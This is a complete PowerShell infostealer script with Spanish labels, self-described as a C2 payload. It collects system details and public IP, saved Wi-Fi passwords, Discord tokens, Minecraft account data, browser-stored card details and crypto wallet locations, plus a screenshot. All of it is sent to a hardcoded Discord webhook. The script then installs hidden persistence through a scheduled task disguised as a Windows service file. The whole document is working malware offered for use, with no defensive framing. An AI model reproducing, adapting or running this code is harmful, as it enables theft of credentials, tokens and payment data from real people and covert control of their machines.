# OMNI C2 v6.0 - PAYLOAD PRINCIPAL

param([string]$WebhookUrl = "https://discord.com/api/webhooks/1510348415148495009/Z2jNquIANWEm9YqLD0dgBmxCj4cMAG8fAtX-1_YukxV2rNwCSBbSwY4meOLj8LqibrRe")

$VictimID = "$env:COMPUTERNAME-$((Get-Random -Maximum 99999))"

function Send-C2 {
    param([string]$Content, [string]$File = $null)
    $body = @{content = "`n[$VictimID]`n$Content"} | ConvertTo-Json
    try {
        if ($File -and (Test-Path $File)) {
            $uri = $WebhookUrl + "?wait=true"
            $form = @{payload_json = $body; file = Get-Item $File}
            Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction SilentlyContinue
        } else {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        }
    } catch {}
}

# === 1. SISTEMA ===
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 1)
try { $publicIP = (Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5 -ErrorAction Stop) } catch { $publicIP = "N/A" }

Send-C2 -Content "NUEVA VICTIMA CONECTADA - PC: $env:COMPUTERNAME - Usuario: $env:USERNAME - OS: $($os.Caption) - RAM: ${ram}GB - IP: $publicIP"

# === 2. WIFI ===
$wifiResult = "WIFI:`n"
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace '.*:\s+', '' }
if (-not $profiles) { $profiles = netsh wlan show profiles | Select-String "Perfil" | ForEach-Object { $_ -replace '.*:\s+', '' } }
foreach ($p in $profiles) {
    try {
        $details = netsh wlan show profile name="$p" key=clear
        $pass = $details | Select-String "Key Content" | ForEach-Object { $_ -replace '.*:\s+', '' }
        if (-not $pass) { $pass = $details | Select-String "Contenido" | ForEach-Object { $_ -replace '.*:\s+', '' } }
        if (-not $pass) { $pass = "No encontrada" }
        $wifiResult += "$p : $pass`n"
    } catch {}
}
Send-C2 -Content $wifiResult

# === 3. MINECRAFT ===
$mcResult = "MINECRAFT:`n"
$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.minecraft\usercache.json"
)
foreach ($p in $paths) {
    if (Test-Path $p) { 
        $mcResult += "OK $([System.IO.Path]::GetFileName($p))`n"
        $data = Get-Content $p -Raw -ErrorAction SilentlyContinue
        if ($data -match '"name"\s*:\s*"([^"]+)"') { $mcResult += "   Usuario: $($matches[1])`n" }
        if ($data -match '"accessToken"') { $mcResult += "   Token presente`n" }
    }
}
foreach ($p in @("$env:APPDATA\.tlauncher\accounts.json","$env:APPDATA\TLauncher\accounts.json","$env:APPDATA\.lunarclient\settings.json","$env:APPDATA\BadlionClient\accounts.json")) {
    if (Test-Path $p) { $mcResult += "OK $([System.IO.Path]::GetFileName($p))`n" }
}
$ssDir = "$env:APPDATA\.minecraft\screenshots"
if (Test-Path $ssDir) { $ss = Get-ChildItem $ssDir -Filter "*.png" -ErrorAction SilentlyContinue; $mcResult += "$($ss.Count) screenshots`n" }
$savesDir = "$env:APPDATA\.minecraft\saves"
if (Test-Path $savesDir) { $worlds = Get-ChildItem $savesDir -Directory -ErrorAction SilentlyContinue; $mcResult += "$($worlds.Count) mundos`n" }
$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) { $mods = Get-ChildItem $modsDir -Filter "*.jar" -ErrorAction SilentlyContinue; $mcResult += "$($mods.Count) mods`n" }
Send-C2 -Content $mcResult

# === 4. DISCORD ===
$discResult = "DISCORD:`n"
$clients = @("$env:APPDATA\discord","$env:APPDATA\discordptb","$env:LOCALAPPDATA\Discord","$env:LOCALAPPDATA\discordcanary")
$tokens = @()
foreach ($base in $clients) {
    $ldb = "$base\Local Storage\leveldb"
    if (Test-Path $ldb) {
        $files = Get-ChildItem $ldb -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try { 
                $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
                if ($content) {
                    if ($content -match '[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}') {
                        $tok = $matches[0]
                        if ($tok -notin $tokens) { $tokens += $tok }
                    }
                    if ($content -match 'mfa\.[a-zA-Z0-9_-]{84}') {
                        $tok = $matches[0]
                        if ($tok -notin $tokens) { $tokens += $tok }
                    }
                }
            } catch {}
        }
    }
}
if ($tokens.Count -gt 0) { $discResult += "$($tokens.Count) TOKENS`n"; foreach ($t in $tokens) { $discResult += "$($t.Substring(0,30))...`n" } } else { $discResult += "Sin tokens`n" }
Send-C2 -Content $discResult

# === 5. TARJETAS ===
$cardsResult = "TARJETAS:`n"
$totalCards = 0
foreach ($b in @(@{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},@{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"})) {
    foreach ($profile in @("Default","Profile 1")) {
        $webData = "$($b.P)\$profile\Web Data"
        if (Test-Path $webData) {
            try {
                $tempDb = "$env:TEMP\wd_$((Get-Random -Maximum 99999)).db"
                Copy-Item $webData $tempDb -Force
                Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Read Only=True")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"
                $reader = $cmd.ExecuteReader()
                while ($reader.Read()) { $totalCards++; $cardsResult += "$($reader["name_on_card"]) - $($reader["expiration_month"])/$($reader["expiration_year"])`n" }
                $reader.Close(); $conn.Close()
                Remove-Item $tempDb -Force
            } catch {}
        }
    }
}
if ($totalCards -eq 0) { $cardsResult += "Sin tarjetas`n" } else { $cardsResult += "Total: $totalCards`n" }
Send-C2 -Content $cardsResult

# === 6. JUEGOS ===
$gamesResult = "JUEGOS:`n"
if (Test-Path "$env:PROGRAMFILES(x86)\Steam") { $gamesResult += "Steam instalado`n" }
if (Test-Path "$env:LOCALAPPDATA\EpicGamesLauncher") { $gamesResult += "Epic Games instalado`n" }
if (Test-Path "$env:LOCALAPPDATA\Riot Games") { $gamesResult += "Riot Games instalado`n" }
if (Test-Path "$env:APPDATA\Spotify") { $gamesResult += "Spotify instalado`n" }
if (Test-Path "$env:APPDATA\Telegram Desktop") { $gamesResult += "Telegram instalado`n" }
Send-C2 -Content $gamesResult

# === 7. CRIPTO ===
$cryptoResult = "CRIPTO:`n"
$wallets = @(
    @{N="MetaMask";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    @{N="Exodus";P="$env:APPDATA\Exodus"},
    @{N="Electrum";P="$env:APPDATA\Electrum"}
)
$found = $false
foreach ($w in $wallets) { if (Test-Path $w.P) { $cryptoResult += "$($w.N)`n"; $found = $true } }
if (-not $found) { $cryptoResult += "Sin wallets`n" }
Send-C2 -Content $cryptoResult

# === 8. CAPTURA ===
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $tempFile = "$env:TEMP\ss_$((Get-Random -Maximum 99999)).png"
    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose(); $bitmap.Dispose()
    Send-C2 -Content "Captura de pantalla" -File $tempFile
    Remove-Item $tempFile -Force
} catch {}

# === 9. PERSISTENCIA ===
try {
    $persistPath = "$env:APPDATA\Microsoft\Windows\svchost.ps1"
    $currentScript = Get-Content $PSCommandPath -Raw -ErrorAction SilentlyContinue
    if ($currentScript) { 
        Set-Content -Path $persistPath -Value $currentScript -Force
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File '$persistPath'"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "WindowsBgSvc" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
    }
    Send-C2 -Content "Persistencia instalada"
} catch { Send-C2 -Content "Error persistencia" }

# === 10. FIN ===
Send-C2 -Content "EXTRACCION COMPLETA"
while ($true) { Start-Sleep -Seconds 60 }
